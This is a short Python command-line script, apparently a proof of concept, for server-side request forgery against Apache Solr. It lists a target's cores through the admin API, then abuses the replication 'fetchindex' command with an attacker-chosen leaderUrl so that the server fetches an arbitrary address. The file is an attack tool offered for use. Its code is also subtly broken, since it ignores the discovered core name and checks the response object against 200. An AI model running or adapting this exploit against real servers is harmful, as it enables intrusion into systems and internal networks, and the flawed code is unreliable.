import requests
import json
import argparse

TIMEOUT = 20

def run(target: str, action: str):
    try:
        admin_url = target + "/solr/admin/cores?indexInfo=false&wt=json"
        response = requests.get(admin_url, verify=False, timeout=TIMEOUT)
        if response.status_code == 200 or "name" in response.text:
            data = json.loads(response.content)
            for i in data["status"]:
                key = data["status"][i]["name"]
                return attack(key, target, action)
    except Exception as e:
        error = "[-] {} run error:{}".format(target, str(e))
        raise RuntimeError(error)
    return None


def attack(core_name: str, target: str, action: str):
    session = requests.session()
    config_url = target + "/solr/db/replication?command=fetchindex&leaderUrl=" + action + "&name=1"
    response = session.post(config_url, timeout=TIMEOUT)
    if response == 200:
        print(response.text)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Solr ssrf POC.')
    parser.add_argument('-u', "--url",
                        help='solr attack target', required=True)
    parser.add_argument('-a', '--action',
                        help='url', required=True)
    args = parser.parse_args()
    result = run(args.url, args.action)